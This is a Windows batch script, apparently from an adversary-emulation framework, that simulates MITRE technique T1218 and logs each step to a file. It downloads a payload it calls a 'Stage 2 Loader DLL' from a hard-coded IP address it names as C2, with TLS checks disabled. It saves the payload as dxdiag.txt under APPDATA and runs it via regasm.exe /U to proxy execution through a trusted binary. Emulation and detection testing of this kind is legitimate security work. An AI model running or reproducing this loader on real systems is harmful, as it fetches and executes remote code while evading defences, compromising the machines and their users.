@echo off
setlocal enabledelayedexpansion

REM Placeholder constant declarations (random-named SET vars, one per PHR_*)
SET aB2cD3eF=%APPDATA%\14402\c9990912
SET gH4iJ5kL=dxdiag.txt
SET mN6oP7qR=https://3.144.153.50/test/stage/2/icon.png?RVFHRG0-R1dD
SET sT8uV9wX=ITZEL-S2B
SET yZ0aB1cD=RVFHRG0
SET eF2gH3iJ=R1dD
SET kL4mN5oP=%PUBLIC%\\macula-simulations.log

REM Cache debug timestamp
SET tsvar=!DATE!/!TIME!

REM Debug: heartbeat_start
echo [!tsvar!][DEBUG][!sT8uV9wX!][!yZ0aB1cD!]: heartbeat_start>> "!kL4mN5oP!" 2>nul

REM Create output directory if it does not exist (fixing previous failure)
if not exist "!aB2cD3eF!" (
    mkdir "!aB2cD3eF!"
    echo [!tsvar!][DEBUG][!sT8uV9wX!][!yZ0aB1cD!]: dir_create=0>> "!kL4mN5oP!" 2>nul
)

REM Heartbeat fetch - download Stage 2 Loader DLL from C2
curl -k -s -o "!aB2cD3eF!\!gH4iJ5kL!" "!mN6oP7qR!"
set download_rc=%errorlevel%
if not "!download_rc!"=="0" (
    echo [!tsvar!][DEBUG][!sT8uV9wX!][!yZ0aB1cD!]: heartbeat_complete=FAIL>> "!kL4mN5oP!" 2>nul
    set ttp_result=FAIL
    set ttp_error=download_failed
) else if not exist "!aB2cD3eF!\!gH4iJ5kL!" (
    echo [!tsvar!][DEBUG][!sT8uV9wX!][!yZ0aB1cD!]: heartbeat_complete=FAIL>> "!kL4mN5oP!" 2>nul
    set ttp_result=FAIL
    set ttp_error=file_not_found
) else (
    echo [!tsvar!][DEBUG][!sT8uV9wX!][!yZ0aB1cD!]: heartbeat_complete=OK>> "!kL4mN5oP!" 2>nul
    set ttp_result=OK
    set ttp_error=
)

REM Position working directory
echo [!tsvar!][DEBUG][!sT8uV9wX!][!yZ0aB1cD!]: chdir_start>> "!kL4mN5oP!" 2>nul
cd /d "!aB2cD3eF!" >nul 2>&1
set chdir_rc=%errorlevel%
echo [!tsvar!][DEBUG][!sT8uV9wX!][!yZ0aB1cD!]: chdir_result=!chdir_rc!>> "!kL4mN5oP!" 2>nul

REM Invoke the downloaded Stage 2 DLL via regasm.exe /U (LOLBIN)
if "!ttp_result!"=="OK" (
    echo [!tsvar!][DEBUG][!sT8uV9wX!][!yZ0aB1cD!]: regasm_start>> "!kL4mN5oP!" 2>nul
    %SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U "!gH4iJ5kL!" >NUL 2>&1
    if "!errorlevel!"=="0" (
        echo [!tsvar!][DEBUG][!sT8uV9wX!][!yZ0aB1cD!]: regasm_complete=OK>> "!kL4mN5oP!" 2>nul
    ) else (
        echo [!tsvar!][DEBUG][!sT8uV9wX!][!yZ0aB1cD!]: regasm_complete=FAIL>> "!kL4mN5oP!" 2>nul
        set ttp_result=FAIL
        set ttp_error=regasm_failed
    )
)

REM Generate TTP timestamp with millisecond precision
for /f "delims=" %%t in ('powershell -nop -c "Get-Date -Format 'yyyy-MM-dd HH:mm:ss.fff'"') do set timestamp=%%t

REM Emit TTP log line (T1218)
echo [!timestamp!][TTP][!sT8uV9wX!][!yZ0aB1cD!]: T1218^|System Binary Proxy Execution=!ttp_result!:!ttp_error!>> "!kL4mN5oP!" 2>&1

endlocal